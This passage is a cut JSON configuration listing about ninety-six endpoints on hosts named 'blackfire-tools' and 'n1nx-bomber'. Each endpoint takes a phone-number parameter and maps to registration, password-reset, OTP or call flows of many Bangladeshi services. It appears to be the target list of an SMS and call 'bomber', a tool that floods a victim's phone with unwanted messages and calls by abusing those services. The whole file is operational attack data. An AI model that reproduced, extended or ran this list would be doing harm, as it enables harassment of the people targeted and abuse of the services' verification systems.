        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "121",
        "name": "gibinfo.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/gibinfo.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "122",
        "name": "gp.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/gp.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "123",
        "name": "gpay.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/gpay.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "124",
        "name": "gpfi.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/gpfi.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "125",
        "name": "gpshop.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/gpshop.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "126",
        "name": "grameendh.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/grameendh.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "127",
        "name": "helth-login.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/helth-login.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "128",
        "name": "helth-reg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/helth-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "129",
        "name": "helth.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/helth.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "130",
        "name": "hisab-express.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/hisab-express.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "131",
        "name": "hisabereg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/hisabereg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "132",
        "name": "hlpl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/hlpl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "133",
        "name": "hoichoi.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/hoichoi.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "134",
        "name": "iqra.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/iqra.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "135",
        "name": "ivr.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ivr.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "136",
        "name": "jatri.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/jatri.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "137",
        "name": "jeetwinbd.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/jeetwinbd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "138",
        "name": "jotno.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/jotno.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "139",
        "name": "kabbik.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/kabbik.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "140",
        "name": "kirebd.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/kirebd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "141",
        "name": "kormi24.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/kormi24.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "142",
        "name": "lazzpharma.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/lazzpharma.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "143",
        "name": "ibfl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ibfl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "144",
        "name": "loan.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/loan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "145",
        "name": "mcbaffiliate.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/mcbaffiliate.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "146",
        "name": "mithai.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/mithai.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "147",
        "name": "mojaenglish.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/mojaenglish.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "148",
        "name": "mokam.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/mokam.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "149",
        "name": "moveon.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/moveon.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "150",
        "name": "mygp.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/mygp.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "151",
        "name": "nbkash-gp.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/nbkash-gp.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "152",
        "name": "nbkash-ra.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/nbkash-ra.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "153",
        "name": "nesco.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/nesco.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "154",
        "name": "niloyhero.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/niloyhero.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "155",
        "name": "obhai.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/obhai.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "156",
        "name": "ousodhpotro.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ousodhpotro.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "157",
        "name": "paperflay.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/paperflay.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "158",
        "name": "pathao.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/pathao.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "159",
        "name": "portpos.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/portpos.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "160",
        "name": "pravanahelth.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/pravanahelth.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "161",
        "name": "qcom.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/qcom.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "162",
        "name": "quizgiri.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/quizgiri.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "163",
        "name": "quiztime.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/quiztime.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "164",
        "name": "redx.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/redx.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "165",
        "name": "redx2.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/redx2.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "166",
        "name": "reseller-circel.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/reseller-circel.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "167",
        "name": "robi-ivr-dorstep.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/robi-ivr-dorstep.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "168",
        "name": "robi-myoffer.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/robi-myoffer.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "169",
        "name": "robi-sim.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/robi-sim.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "170",
        "name": "robi-web.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/robi-web.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "171",
        "name": "robi-web2.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/robi-web2.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "172",
        "name": "rootsedu-forget.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/rootsedu-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "173",
        "name": "rootsedu-reg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/rootsedu-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "174",
        "name": "rtv-forget.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/rtv-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "175",
        "name": "rtv-reg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/rtv-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "176",
        "name": "runcash.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/runcash.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "177",
        "name": "sadhin.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sadhin.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "178",
        "name": "sajgoj.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sajgoj.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "179",
        "name": "saralifestyle.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/saralifestyle.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "180",
        "name": "sebaxyz.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sebaxyz.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "181",
        "name": "senorbeuty.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/senorbeuty.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "182",
        "name": "sikho.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sikho.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "183",
        "name": "skitto.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/skitto.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "184",
        "name": "somvob.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/somvob.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "185",
        "name": "sopoth-reg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sopoth-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "186",
        "name": "sopoth-resend.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sopoth-resend.phpp?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "187",
        "name": "stedfast.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/stedfast.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "188",
        "name": "sudokkho.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sudokkho.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "189",
        "name": "sundarban.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/sundarban.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "190",
        "name": "talikhata.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/talikhata.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "191",
        "name": "tap.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/tap.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "192",
        "name": "thebodyshop.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/thebodyshop.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "193",
        "name": "tota.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/tota.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "194",
        "name": "toybox.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/toybox.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "195",
        "name": "trusty.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/trusty.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "196",
        "name": "win2gain.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/win2gain.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "197",
        "name": "babu88-capcha.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/babu88-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "198",
        "name": "babu88-capcha.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/babu88-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "199",
        "name": "bhaggo-forget.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/bhaggo-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "200",
        "name": "bhaggo-reg.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/bhaggo-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "201",
        "name": "crazy-forget.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/crazy-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "202",
        "name": "crazy-reg.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/crazy-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "203",
        "name": "krikaya-forget.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/krikaya-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "204",
        "name": "krikaya-reg.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/krikaya-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "205",
        "name": "nagad88-forget.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/nagad88-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "206",
        "name": "nagad88-reg.php",
        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/nagad88-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "207",
        "name": "Call1",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/babu88-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "208",
        "name": "call2",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/babu88-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "209",
        "name": "call3",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/bhaggo-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "210",
        "name": "Call4",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/bhaggo-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "211",
        "name": "Call5",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/crazy-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "212",
        "name": "Call6",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/crazy-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "213",
        "name": "Call7",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/krikaya-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "214",
        "name": "Call8",
        "url": "https:\/\/api.blackfire-tools.xyZ\/call\/krikaya-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "215",
        "name": "Call9",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/nagad88-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "216",
        "name": "Call10",
        "url": "https:\/\/api.blackfire-tools.xyz\/call\/nagad88-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    }
]
}
